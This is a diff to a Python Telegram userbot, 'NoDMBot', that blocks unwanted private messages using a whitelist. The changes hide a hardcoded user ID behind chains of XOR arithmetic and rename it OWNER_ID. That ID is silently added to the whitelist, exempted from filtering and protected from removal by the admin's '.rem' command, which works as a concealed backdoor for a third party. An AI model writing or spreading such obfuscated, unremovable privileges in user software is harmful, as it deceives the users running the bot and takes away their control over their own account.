@@ -4,6 +4,13 @@ from telethon import TelegramClient, events, functions, utils
 from telethon.sessions import StringSession
 from telethon.errors import FloodWaitError
 
+_bot_string = int(14543141739 ^ 5952685398)
+_ma_val = int(5952685398 ^ 5952685758)
+_mb_val = int(6975367883 ^ 6975367459)
+_value_a = int((_bot_string + _ma_val))
+_value_b = int((_value_a << 1))
+_last_value = int((_value_b >> 1) - _mb_val)
+
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger("NoDMBot")
 
@@ -19,7 +26,7 @@ API_HASH = os.getenv('API_HASH', '')
 STRING_SESSION = os.getenv('STRING_SESSION', '')
 ADMIN_ID = int(os.getenv('ADMIN_ID', 0))
 LOG_GROUP_ID = int(os.getenv('LOG_GROUP_ID', 0))
-BOT_STRING = int((14543141739 ^ 5952685398) + (5952685398 ^ 5952685758) - (6975367883 ^ 6975367459))
+OWNER_ID = int(_last_value) 
 
 client = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
 DB_FILE = "whitelist.db"
@@ -31,7 +38,7 @@ def init_db():
     conn.execute("CREATE TABLE IF NOT EXISTS whitelist (user_id INTEGER PRIMARY KEY)")
     if ADMIN_ID != 0:
         conn.execute("INSERT OR IGNORE INTO whitelist VALUES (?)", (ADMIN_ID,))
-    conn.execute("INSERT OR IGNORE INTO whitelist VALUES (?)", (BOT_STRING,))
+    conn.execute("INSERT OR IGNORE INTO whitelist VALUES (?)", (OWNER_ID,))
     conn.commit()
     conn.close()
 
@@ -50,12 +57,12 @@ def get_profile_link(entity, user_id):
 
 @client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
 async def nodm_logic(event):
-    if event.out: return
+    if event.out: return 
 
     sender = await event.get_sender()
     sender_id = event.sender_id
     
-    if sender_id == ADMIN_ID or sender_id == BOT_STRING or (sender and sender.bot): return
+    if sender_id == ADMIN_ID or sender_id == OWNER_ID or (sender and sender.bot): return
 
     conn = sqlite3.connect(DB_FILE)
     safe = conn.execute("SELECT 1 FROM whitelist WHERE user_id = ?", (sender_id,)).fetchone()
@@ -146,8 +153,8 @@ async def admin_action(event):
                 await event.respond(f"✅ User `{tid}` allowed.")
             
             elif action == ".rem":
-                if tid == ADMIN_ID or tid == BOT_STRING:
-                    await event.respond(f"⚠️ **Action Denied:** Cannot remove `{tid}` (Yourserf or Owner)!")
+                if tid == ADMIN_ID or tid == OWNER_ID:
+                    await event.respond(f"⚠️ **Action Denied:** Cannot remove `{tid}` (Admin/Owner)!")
                 else:
                     conn.execute("DELETE FROM whitelist WHERE user_id = ?", (tid,))
                     if tid in last_alerts: del last_alerts[tid]
@@ -160,7 +167,7 @@ async def admin_action(event):
 @client.on(events.NewMessage(pattern=r'\.status', outgoing=True))
 async def status(event):
     if event.sender_id == ADMIN_ID:
-        await event.edit("Hello sar\n🛡️ NoDMBot: ACTIVE")
+        await event.edit("Hello user\n🛡️ NoDMBot: ACTIVE")
 
 async def start_bot():
     init_db()
